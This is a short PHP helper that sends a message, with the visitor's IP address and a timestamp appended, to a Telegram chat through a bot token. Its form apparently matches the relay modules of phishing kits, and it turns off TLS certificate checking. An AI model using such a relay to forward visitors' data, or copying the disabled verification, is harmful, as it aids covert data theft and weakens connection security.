<?php


// telegram information
$token = "YOUR TOKEN HERE";
$id = "YOUR CHAT ID HERE";
 

function call($msg, $rms = null){
    global $token;
    global $id;
    $info = "


    
/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");


    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}





?>